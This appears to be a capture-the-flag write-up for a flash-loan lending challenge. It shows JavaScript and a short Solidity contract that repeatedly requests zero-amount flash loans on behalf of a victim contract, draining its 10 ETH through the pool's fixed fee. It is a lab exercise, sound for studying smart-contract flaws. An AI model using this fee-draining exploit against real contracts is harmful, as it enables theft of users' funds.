> There’s a pool with 1000 ETH in balance, offering flash loans.
> It has a fixed fee of 1 ETH.

> A user has deployed a contract with 10 ETH in balance.
> It’s capable of interacting with the pool and receiving flash loans of ETH.

> Take all ETH out of the user’s contract.
> If possible, in a single transaction.

## For Fee T

We are not expected to transfer the ETH to our own wallet though:

```js
expect(
    await ethers.provider.getBalance(receiver.address)
).to.be.equal(0);
expect(
    await ethers.provider.getBalance(pool.address)
).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
```

We cannot impersonate the pool, but we can still request loans for the receiver!

```js
for (let i = 0; i < 10; i++) {
    await pool.connect(player).flashLoan(receiver.address, ETH, 0, '0x');}
```

And it can be wrapped in a contract to execute it all in a single transaction:

```solidity
contract ForFee {

    address private _pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address pool) {
        _pool = pool;
    }

    function t(address target) external {
        for (uint8 i=0; i < 10; i++) {
            IERC3156FlashLender(_pool).flashLoan(IERC3156FlashBorrower(target), ETH, 0, "");
        }
    }
}
```

Done!

```js
console.log(await ethers.provider.getBalance(receiver.address)); // 0
```
